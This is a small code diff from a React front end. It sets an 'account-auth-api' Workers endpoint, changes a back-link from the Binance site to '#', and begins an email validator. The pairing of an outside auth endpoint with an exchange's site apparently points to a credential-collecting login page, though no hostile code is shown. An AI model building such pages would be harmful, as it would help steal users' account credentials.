@@ -10,7 +10,7 @@ import {
 import "./App.css";
 
 const WORKER_URL = "https://account-auth-api.mikaelmika263.workers.dev";
-const BACK_URL = "https://www.binance.com";
+const BACK_URL = "#";
 
 function isValidEmail(value) {
   const trimmed = value.trim();
